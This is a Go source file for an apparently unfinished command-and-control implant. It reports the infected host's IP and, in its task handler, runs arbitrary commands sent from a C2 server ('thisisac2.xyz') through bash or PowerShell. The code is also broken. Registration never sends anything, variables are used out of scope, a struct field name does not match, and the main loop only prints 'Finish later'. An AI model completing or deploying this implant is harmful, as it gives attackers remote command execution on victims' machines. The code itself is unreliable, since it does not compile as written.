package main

import (
	"fmt"
	"runtime"
	"os/exec"
	"net"
	"strings"
	"net/http"
    "time"
	"encoding/json"
	"bytes"
)

type Agent struct {
    LocalIP  string
    ServerIP string
    ServerPort int
	CallbackInterval int
	Client *http.Client
}

type Task struct {
	Action string `json:"action"`
	Command string `json:"command"`
	Filename string `json:"filename"`
	TaskID string `json:"task_id"`
}

type Result struct {
	AgentID string `json:"agent_id"`
	TaskID string `json:"task_id"`
	Result string `json:"result"`
	ReturnCode int `json:"returncode"`
}

func getLocalIP() string {
	if runtime.GOOS == "linux" {
		cmd := exec.Command("bash", "-c", "hostname -I | awk '{print $1}'")
		out, err := cmd.Output()
		if err != nil {
			return "?.?.?.?" // Fallback if command fails
		}
		return strings.TrimSpace(string(out))
	} else {
		addrs, err := net.InterfaceAddrs()
		if err != nil {
			return "?.?.?.?"
		}
		for _, address := range addrs {
			// makes sure to filter out loopback addresses
			if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					return ipnet.IP.String()
				}
			}
		}
		return "?.?.?.?"
	}
}

func (agent *Agent) Register() error {
    data := map[string]string{
        "agent_id": agent.LocalIP,
    }

    jsonData, err := json.Marshal(data)
    if err != nil {
        return fmt.Errorf("failed to marshal JSON: %w", err)
    }
	return nil
}

func (agent *Agent) HandleTask(task Task) (Result, error) {
	var result Result
	result.AgentID = agent.LocalIP
	result.TaskID = task.TaskID

	switch task.Action {
	case "command":
		if runtime.GOOS == "windows" {
			cmd := exec.Command("powershell", "-Command", task.Command)
		} else {
			cmd := exec.Command("bash", "-c", task.Command)
		}
		out, err := cmd.CombinedOutput()
		if err != nil {
			result.Result = string(out)
			result.ReturnCode = cmd.ProcessState.ExitCode()
		} else {
			result.Result = string(out)
			result.ReturnCode = 0
		}
	default:
		return result, fmt.Errorf("Undefined action in JSON: %s", task.Action)
	}

	return result, nil
}

func main(){
	agent := Agent{
        LocalIP:  getLocalIP(),
        ServerIP: "thisisac2.xyz",
        Port:     80,
		Client: &http.Client{
            Timeout: 10 * time.Second,
        },
    }

	// Attempt to register the agent with C2 server until successful
	for {
		err := agent.Register()
		if err != nil {
			fmt.Println("Error registering agent:", err)
		}
		break
	}

	// Main loop to poll server for tasks
	for {
		fmt.Println("Finish later")
	}
}